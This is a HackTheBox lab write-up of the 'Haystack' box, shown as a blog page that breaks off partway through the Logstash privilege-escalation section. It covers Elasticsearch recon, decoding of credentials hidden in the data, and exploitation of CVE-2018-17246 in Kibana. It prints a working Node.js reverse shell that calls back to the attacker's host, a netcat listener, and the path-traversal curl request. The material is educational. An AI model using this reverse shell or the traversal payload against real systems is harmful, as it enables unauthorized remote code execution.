<!DOCTYPE html>
<html lang=en>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Haystack is a very interesting box to learn more about the ELK (Elasticsearch, Logstash, Kibana) stack which is becoming very popular. The user part is very CTF type while the root part is more real">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox - Haystack">
<meta property="og:url" content="https://hg8.sh/posts/haystack/index.html">
<meta property="og:site_name" content="hg8&#39;s Notes — My notes about infosec world. Pentest&#x2F;Bug Bounty&#x2F;CTF Writeups.">
<meta property="og:description" content="Haystack is a very interesting box to learn more about the ELK (Elasticsearch, Logstash, Kibana) stack which is becoming very popular. The user part is very CTF type while the root part is more real">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/82158099-02e7b280-9886-11ea-8799-d7f5df9a20bb.png">
<meta property="article:published_time" content="2019-11-01T23:00:00.000Z">
<meta property="article:modified_time" content="2022-08-04T08:37:52.828Z">
<meta property="article:author" content="hg8">
<meta property="article:tag" content="linux">
<meta property="article:tag" content="haystack">
<meta property="article:tag" content="gobuster">
<meta property="article:tag" content="steganography">
<meta property="article:tag" content="elasticsearch">
<meta property="article:tag" content="logstash">
<meta property="article:tag" content="kibana">
<meta property="article:tag" content="elk">
<meta property="article:tag" content="cve-2018-17246">
<meta property="article:tag" content="lfi">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://user-images.githubusercontent.com/9076747/82158099-02e7b280-9886-11ea-8799-d7f5df9a20bb.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
     
    <title>HackTheBox - Haystack :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
    
<link rel="stylesheet" href="/css/style.css">

    
    
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="hg8's Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups." type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/posts/jarvis/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/posts/writeup/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
    </span>
    <br/>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">1.</span> <span class="toc-text">User Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Stenography"><span class="toc-number">1.2.</span> <span class="toc-text">Stenography</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Elasticsearch"><span class="toc-number">1.3.</span> <span class="toc-text">Elasticsearch</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-flag"><span class="toc-number">2.</span> <span class="toc-text">Root flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-security-gt-kibana-user"><span class="toc-number">2.1.</span> <span class="toc-text">Pivot security -&gt; kibana user</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Logstash-gt-root"><span class="toc-number">2.2.</span> <span class="toc-text">Logstash -&gt; root</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        <header id="header">
  <a href="/">
  
      <div id="logo" style="background-image: url(/images/logo.webp);"></div>
  
    <span class="logo__mark"></span>
    <span class="logo__text">./hg8.sh</span>
    <span class="logo__cursor"></span>
  </a>
  <div id="nav">
    <ul>
      <li class="icon">
        <a href="#"><i class="fas fa-bars fa-2x"></i></a>
      </li>
       
        <li><a href="/">Home</a></li>
       
        <li><a href="/about/">About</a></li>
       
        <li><a href="/archives/">Posts</a></li>
       
        <li><a href="/search/">Search</a></li>
      
    </ul>
  </div>
</header>

        
          <br>
          <br>
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        HackTheBox - Haystack
    </h1>



    <div class="meta"> 
      
    <div class="postdate">
      
        <time datetime="2019-11-01T23:00:00.000Z" itemprop="datePublished">02-11-2019</time>
        
      
    </div>


      — Written by 
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">hg8</span>
      </span>
      —
      8 min read
    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <img width="582" alt="haystack-hackthebox" src="https://user-images.githubusercontent.com/9076747/82158099-02e7b280-9886-11ea-8799-d7f5df9a20bb.png">

<p>Haystack is a very interesting box to learn more about the ELK (Elasticsearch, Logstash, Kibana) stack which is becoming very popular. The user part is very CTF type while the root part is more realistic scenario.</p>
<p>First thing first, let’s add the box IP to the hosts file: </p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&#x27;10.10.10.115 haystack.htb&#x27;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>

<h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC 10.10.10.115</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-29 22:08 CEST</span><br><span class="line">Nmap scan report for haystack.htb (10.10.10.115)</span><br><span class="line">Host is up (0.75s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">80/tcp   open  http    nginx 1.12.2</span><br><span class="line">9200/tcp open  http    nginx 1.12.2</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 87.23 seconds</span><br></pre></td></tr></table></figure>

<p>Alright nothing suprising here: SSH, HTTP and 9200 which is port used by Elasticsearch. Let’s start.</p>
<h3 id="Stenography"><a href="#Stenography" class="headerlink" title="Stenography"></a>Stenography</h3><p>Once opening <a target="_blank" rel="noopener" href="http://haystack.htb/">http://haystack.htb</a> we are greeted with a single image.</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;needle.jpg&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>gobuster</code> doesn’t find anything else interresting. So let’s check this image :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ wget haystack.htb/needle.jpg</span><br><span class="line">[hg8@archbook ~]$ file needle.jpg</span><br><span class="line">needle.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 96x96, segment length 16, Exif Standard: [TIFF image data, big-endian, direntries=5, xresolution=74, yresolution=82, resolutionunit=2, software=paint.net 4.1.1], baseline, precision 8, 1200x803, components 3</span><br></pre></td></tr></table></figure>

<p>So far so good, nothing suspicious. Let’s see if we can find strings in it :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ strings needle.jpg</span><br><span class="line">[...]</span><br><span class="line">bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==</span><br></pre></td></tr></table></figure>

<p>Let’s decode this base64 string :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==&quot;</span> | base64 -d</span><br><span class="line">la aguja en el pajar es <span class="string">&quot;clave&quot;</span></span><br></pre></td></tr></table></figure>

<p>A hint. Let’s keep <code>clave</code> in mind (key in Spanish). I think there is nothing else to find on the http service so let’s move on to the Elasticsearch instance.</p>
<h3 id="Elasticsearch"><a href="#Elasticsearch" class="headerlink" title="Elasticsearch"></a>Elasticsearch</h3><p>Opening port 9200 return the following json:</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ http haystack.htb:<span class="number">9200</span></span><br><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;cluster_name&quot;</span>: <span class="string">&quot;elasticsearch&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;cluster_uuid&quot;</span>: <span class="string">&quot;pjrX7V_gSFmJY-DxP4tCQg&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;iQEYHgS&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;tagline&quot;</span>: <span class="string">&quot;You Know, for Search&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;version&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;build_date&quot;</span>: <span class="string">&quot;2018-09-26T13:34:09.098244Z&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;build_flavor&quot;</span>: <span class="string">&quot;default&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;build_hash&quot;</span>: <span class="string">&quot;04711c2&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;build_snapshot&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">&quot;build_type&quot;</span>: <span class="string">&quot;rpm&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;lucene_version&quot;</span>: <span class="string">&quot;7.4.0&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;minimum_index_compatibility_version&quot;</span>: <span class="string">&quot;5.0.0&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;minimum_wire_compatibility_version&quot;</span>: <span class="string">&quot;5.6.0&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;number&quot;</span>: <span class="string">&quot;6.4.2&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>It’s a classic Elastic cluster. On version 6.4.2 (not the most recent one).</p>
<p>We can use the <code>_cat</code> endpoint to list all indexes :</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ http &quot;haystack.htb:9200/_cat/indices&quot;</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">.kibana 6tjAYZrgQ5CwwR0g6VOoRg 1 0    2 0  14.3kb  14.3kb</span><br><span class="line">quotes  ZG2D1IqkQNiNZmi2HRImnQ 5 1  253 0 262.7kb 262.7kb</span><br><span class="line">bank    eSVpNfCfREyYoVigNWcrMw 5 1 1000 0 483.2kb 483.2kb</span><br></pre></td></tr></table></figure>

<p>So we have <code>bank</code> with 1000 records and <code>quotes</code> with 253 records. Let’s search across those documents to see if we can find something interesting with our previous hint in mind.</p>
<p>According the the <a target="_blank" rel="noopener" href="https://www.elastic.co/guide/en/elasticsearch/reference/6.4/search-search.html">documentation</a>, we can use the <code>_search</code> endpoint to search across all documents. Searching for the keyword <code>key</code> doesn’t seem to return any interesting user or information. Let’s try with the <code>clave</code> keyword we found in the image :</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ http <span class="string">&quot;haystack.htb:9200/_search?q=clave&quot;</span></span><br><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;_shards&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;failed&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">&quot;skipped&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">&quot;successful&quot;</span>: <span class="number">11</span>,</span><br><span class="line">        <span class="attr">&quot;total&quot;</span>: <span class="number">11</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;hits&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;hits&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">&quot;_id&quot;</span>: <span class="string">&quot;45&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;_index&quot;</span>: <span class="string">&quot;quotes&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;_score&quot;</span>: <span class="number">5.9335938</span>,</span><br><span class="line">                <span class="attr">&quot;_source&quot;</span>: &#123;</span><br><span class="line">                    <span class="attr">&quot;quote&quot;</span>: <span class="string">&quot;Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg &quot;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">&quot;_type&quot;</span>: <span class="string">&quot;quote&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">&quot;_id&quot;</span>: <span class="string">&quot;111&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;_index&quot;</span>: <span class="string">&quot;quotes&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;_score&quot;</span>: <span class="number">5.3459888</span>,</span><br><span class="line">                <span class="attr">&quot;_source&quot;</span>: &#123;</span><br><span class="line">                    <span class="attr">&quot;quote&quot;</span>: <span class="string">&quot;Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk=&quot;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">&quot;_type&quot;</span>: <span class="string">&quot;quote&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">&quot;max_score&quot;</span>: <span class="number">5.9335938</span>,</span><br><span class="line">        <span class="attr">&quot;total&quot;</span>: <span class="number">2</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;timed_out&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">&quot;took&quot;</span>: <span class="number">25</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Neat, sounds promising. Let’s decode :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&#x27;dXNlcjogc2VjdXJpdHkg&#x27;</span> | base64 -d</span><br><span class="line">user: security</span><br><span class="line"></span><br><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&#x27;cGFzczogc3BhbmlzaC5pcy5rZXk=&#x27;</span> | base64 -d</span><br><span class="line">pass: spanish.is.key</span><br></pre></td></tr></table></figure>

<p>An username and a password, couldn’t ask for anything better! Is that SSH credentials ?</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh security@haystack.htb</span><br><span class="line">security@haystack.htb<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">Last login: Thu Aug 29 16:24:15 2019 from 10.10.10.85</span></span><br><span class="line"><span class="string">[security@haystack ~]$</span></span><br><span class="line"><span class="string">[security@haystack ~]$ cat user.txt</span></span><br><span class="line"><span class="string">04d1xxxxxxxxxxxxxxx8eb929</span></span><br></pre></td></tr></table></figure>

<p>First step done. Time for root.</p>
<h2 id="Root-flag"><a href="#Root-flag" class="headerlink" title="Root flag"></a>Root flag</h2><p>Now that we have user let’s try to elevate privilege. Privilege enumeration scripts output nothing really interresting so let’s focus on the ELK stack again which seems the core part of this box.</p>
<h3 id="Pivot-security-gt-kibana-user"><a href="#Pivot-security-gt-kibana-user" class="headerlink" title="Pivot security -&gt; kibana user"></a>Pivot security -&gt; kibana user</h3><p>Kibana and Logstash are installed but configuration files are inaccesible to the <code>security</code> user :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[security@haystack conf.d]$ cat /etc/passwd</span><br><span class="line">[...]</span><br><span class="line">security:x:1000:1000:security:/home/security:/bin/bash</span><br><span class="line">elasticsearch:x:997:995:elasticsearch user:/nonexistent:/sbin/nologin</span><br><span class="line">logstash:x:996:994:logstash:/usr/share/logstash:/sbin/nologin</span><br><span class="line">kibana:x:994:992:kibana service user:/home/kibana:/sbin/nologin</span><br><span class="line"></span><br><span class="line">[security@haystack conf.d]$ <span class="built_in">cd</span> /opt/kibana/</span><br><span class="line">-bash: <span class="built_in">cd</span>: /opt/kibana/: Permiso denegado</span><br><span class="line"></span><br><span class="line">[security@haystack conf.d]$ cat /etc/logstash/conf.d/filter.conf</span><br><span class="line">cat: /etc/logstash/conf.d/filter.conf: Permiso denegado</span><br></pre></td></tr></table></figure>

<p>Seems like we will need to pivot to <code>Kibana</code> or <code>Logstash</code> user to make progress.</p>
<p>For now we don’t have informations about neither Kibana nor Logstash. Let’s check Elasticsearch again :</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ http haystack.htb:<span class="number">9200</span></span><br><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="attr">&quot;cluster_name&quot;</span>: <span class="string">&quot;elasticsearch&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;cluster_uuid&quot;</span>: <span class="string">&quot;pjrX7V_gSFmJY-DxP4tCQg&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;iQEYHgS&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;tagline&quot;</span>: <span class="string">&quot;You Know, for Search&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;version&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;build_date&quot;</span>: <span class="string">&quot;2018-09-26T13:34:09.098244Z&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;build_flavor&quot;</span>: <span class="string">&quot;default&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;build_hash&quot;</span>: <span class="string">&quot;04711c2&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;build_snapshot&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">&quot;build_type&quot;</span>: <span class="string">&quot;rpm&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;lucene_version&quot;</span>: <span class="string">&quot;7.4.0&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;minimum_index_compatibility_version&quot;</span>: <span class="string">&quot;5.0.0&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;minimum_wire_compatibility_version&quot;</span>: <span class="string">&quot;5.6.0&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;number&quot;</span>: <span class="string">&quot;6.4.2&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Elasticsearch is in version 6.4.2 for a build date of September 2018. That’s quite old.</p>
<p>And indeed after a bit of GoogleFu we stumbled upon CVE-2018-17246 :</p>
<blockquote>
<p>Kibana versions before 6.4.3 and 5.6.13 contain an arbitrary file inclusion flaw in the Console plugin. An attacker with access to the Kibana Console API could send a request that will attempt to execute javascript code. This could possibly lead to an attacker executing arbitrary commands with permissions of the Kibana process on the host system.</p>
</blockquote>
<p>More informations are available on <a target="_blank" rel="noopener" href="https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/">CyberArk website</a> and gives us example on how to run this exploit.</p>
<p>First we need to write a NodeJS reserve shell (I used the one found <a target="_blank" rel="noopener" href="https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell#the-nodejs-reverse-shell">here</a>) to the <code>/tmp/hg8.js</code> folder:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">&quot;net&quot;</span>),</span><br><span class="line">        cp = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>),</span><br><span class="line">        sh = cp.spawn(<span class="string">&quot;/bin/sh&quot;</span>, []);</span><br><span class="line">    <span class="keyword">var</span> client = <span class="keyword">new</span> net.Socket();</span><br><span class="line">    client.connect(<span class="number">8585</span>, <span class="string">&quot;10.10.10.10&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        client.pipe(sh.stdin);</span><br><span class="line">        sh.stdout.pipe(client);</span><br><span class="line">        sh.stderr.pipe(client);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="regexp">/a/</span>;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<p>Start <code>netcat</code> utility to listen for the reverse shell:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure>

<p>Let’s now launch the exploit on the local instance of Kibana.<br>According to the <a target="_blank" rel="noopener" href="https://www.elastic.co/guide/en/kibana/current/settings.html">documentation</a> Kibana runs on port <code>5601</code> :</p>
<blockquote>
<p>The default settings configure Kibana to run on localhost:5601.</p>
</blockquote>
<p>We now have every informations needed, let’s launch our exploit:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://localhost:5601/api/console/api_server?sense_version=@@SENSE_VERSION&amp;apis=../../../../../../../../../../../tmp/hg8.js&quot;</span></span><br></pre></td></tr></table></figure>

<p>On our <code>netcat</code> the connection appear :</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.10:53792</span><br><span class="line">id</span><br><span class="line">uid=994(kibana) gid=992(kibana) grupos=992(kibana) contexto=system_u:system_r:unconfined_service_t:s0</span><br></pre></td></tr></table></figure>

<p>Good we are on Kibana user now.</p>
<p>Let’s upgrade our shell to a fully interactive one for easiest work (check out this <a target="_blank" rel="noopener" href="https://www.metahackers.pro/upgrade-shell-to-fully-interactive-tty-shell/">blog post</a> for more informations):</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">$ <span class="built_in">export</span> TERM=xterm-256color</span><br><span class="line">$ <span class="built_in">export</span> SHELL=/bin/bash</span><br><span class="line">$ <span class="comment"># CTRL + Z</span></span><br><span class="line">$ stty raw -<span class="built_in">echo</span>;<span class="built_in">fg</span></span><br><span class="line">                        reset</span><br><span class="line">$</span><br></pre></td></tr></table></figure>

<h3 id="Logstash-gt-root"><a href="#Logstash-gt-root" class="headerlink" title="Logstash -&gt; root"></a>Logstash -&gt; root</h3><p>Looking around show that <code>/opt/kibana/</code> turn out to be empty, <code>/etc/elasticsearch/</code> still can’t be accessed.</p>
<p><code>/etc/logstash/</code> belong to <code>kibana</code> group so we can read the content. Let’s dig.</p>
<p>As a reminder Logstash is a tool that collect various logs, parses them, and writes the parsed data to an Elasticsearch cluster :</p>
<blockquote>
<p>Logstash (part of the Elastic Stack) integrates data from any source, in any format with this flexible, open source collection, parsing, and enrichment pipeline.<br><a target="_blank" rel="noopener" href="https://www.elastic.co/fr/products/logstash">https://www.elastic.co/fr/products/logstash</a></p>
</blockquote>
<p>Once reading the <code>startup.options</code> file, an information catch the eye :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/logstash/startup.options</span><br><span class="line"><span class="comment"># user and group id to be invoked as</span></span><br><span class="line"><span class="comment">#LS_USER=logstash</span></span><br><span class="line"><span class="comment">#LS_GROUP=logstash</span></span><br><span class="line">LS_USER=root</span><br><span class="line">LS_GROUP=root</span><br></pre></td></tr></table></figure>

<p>So Logstash will run not as <code>logstash</code> user but as <code>root</code> user. We are on the right track.<br>The <code>conf.d</code> folder contains three files. According to its contents, here what each file do:</p>
<ul>
<li><code>input.conf</code> tell Logstash where to search for logs.</li>
<li><code>filter.conf</code> filter what data is treated and what is ignored.</li>
<li><code>output.conf</code> define what to do with parsed data.</li>
</ul>
